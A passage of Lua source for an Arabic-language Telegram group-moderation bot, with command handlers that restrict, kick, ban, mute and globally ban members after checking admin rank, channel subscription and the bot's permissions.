LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0,tonumber(msg.date+Time)})
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تقييده في الكروب \n• لمدة : "..TimeKed[1]..' '..TimeKed[2]).Reply,"md",true)  
end

if text and text:match('^تقييد (%d+) (.*) (%d+)$') then
local UserId = {text:match('^تقييد (%d+) (.*) (%d+)$') }
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(LaRiCa.."Status:BanId"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local UserInfo = LuaTele.getUser(UserId[3])
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,UserId[3]) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId[3]).." }*","md",true)  
end
if UserId[2] == 'يوم' then
Time_Restrict = UserId[1]:match('(%d+)')
Time = Time_Restrict* 86400
end
if UserId[2] == 'ساعه' then
Time_Restrict = UserId[1]:match('(%d+)')
Time = Time_Restrict* 3600
end
if UserId[2] == 'دقيقه' then
Time_Restrict = UserId[1]:match('(%d+)')
Time = Time_Restrict* 60
end
LuaTele.setChatMemberStatus(msg.chat_id,UserId[3],'restricted',{1,0,0,0,0,0,0,0,0,tonumber(msg.date+Time)})
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[3],"\n• تم تقييده في الكروب \n• لمدة : "..UserId[1]..' ' ..UserId[2]).Reply,"md",true)  
end
if text and text:match('^تقييد @(%S+)$') then
local UserName = text:match('^تقييد @(%S+)$')
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if not msg.Creator and not Redis:get(LaRiCa.."Status:BanId"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." }*","md",true)  
              end
LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,0,0,0,0,0,0,0,0})
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم تقييده في الكروب ").Reply,"md",true)  
end

if text and text:match('^الغاء التقييد @(%S+)$') then
local UserName = text:match('^الغاء التقييد @(%S+)$')
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1})
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم الغاء تقييده من الكروب").Reply,"md",true)  
end

if text and text:match('^طرد @(%S+)$') then
local UserName = text:match('^طرد @(%S+)$')
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(LaRiCa.."Status:BanId"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." }*","md",true)  
end
LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1,1})
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم طرده من الكروب ").Reply,"md",true)  
end
if text == ('حظر عام') and msg.reply_to_message_id ~= 0 then
if not msg.Devss then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if StatusCanOrNotCan(msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." }*","md",true)  
end
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if Controller(msg_chat_id,Message_Reply.sender.user_id) == 'المطور الاساسي' then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." }*","md",true)  
end
if Redis:sismember(LaRiCa.."BanAll:Groups",Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم حظره عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."BanAll:Groups",Message_Reply.sender.user_id) 
LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'banned',0)
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم حظره عام من المجموعات ").Reply,"md",true)  
end
end
if text == ('الغاء العام') and msg.reply_to_message_id ~= 0 then
if not msg.Devss then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end

local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if not Redis:sismember(LaRiCa.."BanAll:Groups",Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم الغاء حظره عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."BanAll:Groups",Message_Reply.sender.user_id) 
LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم الغاء حظره عام من المجموعات  ").Reply,"md",true)  
end
end
if text == ('كتم عام') and msg.reply_to_message_id ~= 0 then
if not msg.Devss then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end

local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if Controller(msg_chat_id,Message_Reply.sender.user_id) == 'المطور الاساسي' then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." }*","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." }*","md",true)  
end
if Redis:sismember(LaRiCa.."ktmAll:Groups",Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم كتمه عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."ktmAll:Groups",Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم كتمه عام من المجموعات ").Reply,"md",true)  
end
end
if text == ('الغاء كتم العام') and msg.reply_to_message_id ~= 0 then
if not msg.Devss then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end

local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if not Redis:sismember(LaRiCa.."ktmAll:Groups",Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم الغاء كتمه عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."ktmAll:Groups",Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم الغاء كتمه عام من المجموعات  ").Reply,"md",true)  
end
end
if text == ('حظر') and msg.reply_to_message_id ~= 0 then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(LaRiCa.."Status:BanId"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." }*","md",true)  
end
if Redis:sismember(LaRiCa.."BanGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم حظره من الكروب مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."BanGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'banned',0)
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم حظره من الكروب ").Reply,"md",true)  
end
end
if text == ('الغاء حظر') and msg.reply_to_message_id ~= 0 then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if not Redis:sismember(LaRiCa.."BanGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم الغاء حظره من الكروب مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."BanGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم الغاء حظره من الكروب  ").Reply,"md",true)  
end
end

if text == ('كتم') and msg.reply_to_message_id ~= 0 then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if GetInfoBot(msg).Delmsg == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حذف الرسائل* ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if StatusSilent(msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." }*","md",true)  
end
if Redis:sismember(LaRiCa.."SilentGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم كتمه في الكروب مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم كتمه في الكروب  ").Reply,"md",true)  
end
end
if text == ('الغاء كتم') and msg.reply_to_message_id ~= 0 then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if not Redis:sismember(LaRiCa.."SilentGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم الغاء كتمه من الكروب ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."SilentGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم الغاء كتمه من الكروب ").Reply,"md",true)  
end
end

if text == ('تقييد') and msg.reply_to_message_id ~= 0 then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(LaRiCa.."Status:BanId"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." }*","md",true)  
end
LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تقييده في الكروب ").Reply,"md",true)  
end

if text == ('الغاء التقييد') and msg.reply_to_message_id ~= 0 then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'restricted',{1,1,1,1,1,1,1,1})
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم الغاء تقييده من الكروب").Reply,"md",true)  
end

if text == ('طرد') and msg.reply_to_message_id ~= 0 then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(LaRiCa.."Status:BanId"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." }*","md",true)  
end
LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'banned',0)
--LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم طرده من الكروب ").Reply,"md",true)  
end

if text and text:match('^حظر عام (%d+)$') then
local UserId = text:match('^حظر عام (%d+)$')
if not msg.Devss then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end

local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end 
if Controller(msg_chat_id,UserId) == 'المطور الاساسي' then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId).." }*","md",true)  
end
if UserId == "1573309498" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على مطور السورس*","md",true)  
